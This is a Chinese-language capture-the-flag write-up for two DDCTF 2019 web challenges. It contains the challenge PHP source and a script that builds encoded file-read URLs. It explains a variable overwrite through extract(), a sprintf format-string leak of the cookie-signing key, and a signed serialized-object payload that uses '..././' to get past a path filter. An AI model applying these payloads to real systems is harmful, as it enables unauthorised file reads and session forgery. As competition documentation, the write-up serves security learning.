## DDCTF-2019-web-部分wp
@(技术小卖铺)[ctf]
### 滴~
进入题目，看到url`http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09`
类型base64字符串
进行两次base64解码，得到16进制代码，进行ascii转换
![Alt text](./1555385072651.png)
可以看到结果为flag.jpg，得到jpg的编码方案
写脚本如下
```
import base64

text = input("请输入字符串：")
l = len(text)
text_ascii = ""

for i in range(0,l):
	text_ascii += str(hex(ord(text[i]))[2:])

text_base64 = base64.b64encode(base64.b64encode(text_ascii.encode('utf-8')))


url = "http://117.51.150.246/index.php?jpg=" + text_base64.decode('utf-8')
print(url)
```
尝试读取index.php内容，可以发现结果输出在src内，base64解码得到相应源码
```
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 *
 */
```
有一个地方比较脑洞就是，flag file文件是在practice.txt.swp中泄露的![Alt text](./1555385479582.png)
因而可以通过构造`f1agconfigddctf.php`得到f1ag!ddctf.php的源代码
```
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
	{
		echo $flag;
	}
	else
	{
		echo'hello';
	}
}
```
extract函数可以将键名变为变量，从而达到变量覆盖，file_get_contents值可以用php://input进行控制，所以可以构造如下
![Alt text](./1555386142202.png)

### web签到题
访问index.php
![Alt text](./1555342566364.png)
查看源码
![Alt text](./1555342588191.png)
查看js文件
```
/**
 * Created by PhpStorm.
 * User: didi
 * Date: 2019/1/13
 * Time: 9:05 PM
 */

function auth() {
    $.ajax({
        type: "post",
        url:"http://117.51.158.44/app/Auth.php",
        contentType: "application/json;charset=utf-8",
        dataType: "json",
        beforeSend: function (XMLHttpRequest) {
            XMLHttpRequest.setRequestHeader("didictf_username", "");
        },
        success: function (getdata) {
           console.log(getdata);
           if(getdata.data !== '') {
               document.getElementById('auth').innerHTML = getdata.data;
           }
        },error:function(error){
            console.log(error);
        }
    });
}
```
是一个ajax，自动向服务器请求，	并带上didictf_username头。
burpsuit抓包，将请求头添加admin字段
![Alt text](./1555342991534.png)
返回数据
![Alt text](./1555343818269.png)
得到对应目录，访问得到源码
Application.php
```

Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}
```
Session.php
```

include 'Application.php';
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return FALSE;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf->index();

```
代码主要将用户数组进行序列化与秘钥做哈希值存储在cookie中，可以进行读取
这题考点主要是反序列化漏洞，主要在于绕过哈希值的检验
```
if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
```
那么就要想办法获取秘钥
![Alt text](./1555379865472.png)
可以将nickname传入%s，在sprintf第二次赋值的时候，就能够将秘钥进行读取。
从而获得秘钥：EzblrbNS
有了秘钥就可以进行构造对象来注入
这是我构造的对象，文件读取漏洞的过滤通过拼接两个../就能绕过
```
O:7:"Session":8:{s:9:"eancrykey";s:0:"";s:17:"cookie_expiration";i:7200;s:11:"cookie_name";s:8:"ddctf_id";s:11:"cookie_path";s:0:"";s:13:"cookie_domain";s:0:"";s:13:"cookie_secure";b:0;s:8:"activity";s:7:"DiDiCTF";s:4:"path";s:21:"..././config/flag.txt";}
```
通过秘钥合并session数组并得到其哈希值，拼接后得到
```
O:7:"Session":8:{s:9:"eancrykey";s:0:"";s:17:"cookie_expiration";i:7200;s:11:"cookie_name";s:8:"ddctf_id";s:11:"cookie_path";s:0:"";s:13:"cookie_domain";s:0:"";s:13:"cookie_secure";b:0;s:8:"activity";s:7:"DiDiCTF";s:4:"path";s:21:"..././config/flag.txt";}639015ac868c5bf47765758fba32c3b1
```
通过将cookie进行修改，提交即可获得flag
![Alt text](./1555341460234.png)